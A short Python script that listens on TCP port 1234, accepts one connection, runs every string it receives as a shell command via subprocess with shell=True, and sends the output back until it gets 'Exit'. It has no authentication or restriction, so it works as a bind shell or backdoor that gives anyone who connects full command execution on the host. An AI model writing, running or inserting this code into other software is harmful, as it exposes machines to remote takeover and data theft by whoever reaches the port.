import socket
import sys
import subprocess
s=socket.socket()
host=socket.gethostname()
port=1234
s.bind((host,port))
s.listen(5)
print("Waiting...")
conn,addr=s.accept()
print("Recieving From",addr)
while True:
    data=conn.recv(1024).decode()
    print("Client:",data)
    if data=="Exit" or not data:
        print("Server Exiting")
        break
    else:
        p=subprocess.run(data,capture_output=True,shell=True)
        response=p.stdout
        conn.send(response)
s.close()